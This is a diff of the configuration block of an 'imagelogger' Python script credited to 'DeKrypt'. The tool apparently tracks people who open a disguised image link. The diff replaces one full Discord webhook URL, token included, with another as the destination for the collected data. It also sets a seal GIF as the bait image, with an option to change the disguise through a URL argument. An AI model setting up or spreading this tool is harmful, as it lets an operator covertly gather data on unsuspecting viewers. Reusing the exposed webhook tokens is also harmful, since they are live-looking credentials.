@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1510370749343600720/3bibbOebGjBvG1wSUZDGC2wiL8rwJlST5RXprKYu8exiO89QR2tV_vBENCEndIGGGx00 ",
+    "webhook": "https://discord.com/api/webhooks/1510362656198885508/QP8oHaF7q70ulPEbz0x7eGZbhIOkXG91vSEkQPdxsxdfg2XkkstdVaBE0hw4toFUTAFY",
     "image": "https://tenor.com/view/hiyori-seal-seals-spotted-seal-hiyori-seal-gif-12976352685833069843", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
